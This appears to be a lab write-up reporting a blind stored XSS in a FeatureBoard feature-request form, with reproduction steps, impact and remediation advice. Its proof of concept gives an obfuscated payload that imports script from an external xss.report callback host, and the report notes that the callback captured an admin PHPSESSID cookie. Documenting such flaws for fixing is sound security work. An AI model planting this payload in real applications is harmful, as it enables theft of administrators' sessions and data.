## Title
Blind XSS - FeatureBoard Feature Requests

## Description
**Affected URL:** https://featureboard.pwnedbox.site/

The FeatureBoard application accepts user-controlled input through the Feature Title, What would you like to see, and Your Name fields. A malicious payload was submitted through the feature request form and stored by the application.

When the submitted request was accessed through the administrative feedback inbox, the payload executed JavaScript in the administrator's browser and generated an external callback. This confirms a Blind Stored XSS vulnerability.

## Steps to Reproduce
1. Open `https://featureboard.pwnedbox.site/#submit`.
2. Insert the payload into the Feature Title, description, and Your Name fields.
3. Submit the feature request.
4. Access the administrative dashboard and open the submitted request.
5. Check the XSS reporting dashboard for the callback.

## POC (Proof of Concept)
**Lab Address:** https://featureboard.pwnedbox.site/

**Vulnerable Fields:** Feature Title, What would you like to see, Your Name.

**Payload:**
```html
"><imaGE/src/onerror=import('//xss.report/c/mihir')>
```

**Observed Result:**
The submitted request appeared in the administrative feedback inbox. The XSS reporting dashboard recorded callbacks originating from the administrative interface.

The captured report showed:
- **Vulnerable Page URL:** `https://featureboard.pwnedbox.site/admin/index.php?status=under_review`
- **Referrer:** `https://featureboard.pwnedbox.site/admin/index.php`
- **Cookie:** A `PHPSESSID` value was recorded.

This confirms JavaScript execution in the administrative browsing context. Actual session hijacking was not independently demonstrated.

**Screenshot Evidence:**
1. Feature request form containing the injected payload.
   <img width="1919" height="971" alt="image" src="https://github.com/user-attachments/assets/22555323-0bab-402d-9122-5e3c59e9cd33" />

2. Administrative feedback inbox displaying the submitted request.
   <img width="1919" height="978" alt="image" src="https://github.com/user-attachments/assets/cdf74b18-629a-49ca-b2b7-3a36171970e1" />

3. XSS reporting dashboard showing callback activity.
   <img width="1919" height="975" alt="image" src="https://github.com/user-attachments/assets/c19ce39b-d244-41d4-9fc8-491e107e8bc6" />

4. Detailed XSS report showing the administrative URL, referrer, and cookie information.
   <img width="1919" height="975" alt="image" src="https://github.com/user-attachments/assets/301f9f76-fe14-44ea-afe1-f571e653a70f" />


## Impact
An attacker could submit a malicious feature request that executes JavaScript when an administrator views the submitted content.

- It may expose sensitive information accessible through the administrator's browser.
- It may allow unauthorized actions within the administrator's authenticated session.
- It may expose session cookie information if cookies are not protected with the `HttpOnly` attribute.
- It may allow manipulation of the administrative interface.

## Remediation
1. Apply context-aware output encoding to all user-controlled fields before rendering them.
2. Prevent untrusted HTML and JavaScript from being executed.
3. Use safe templating methods instead of directly inserting user input into HTML.
4. Set session cookies with the `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
5. Implement a restrictive Content Security Policy (CSP).
6. Review and sanitize previously stored feature requests.
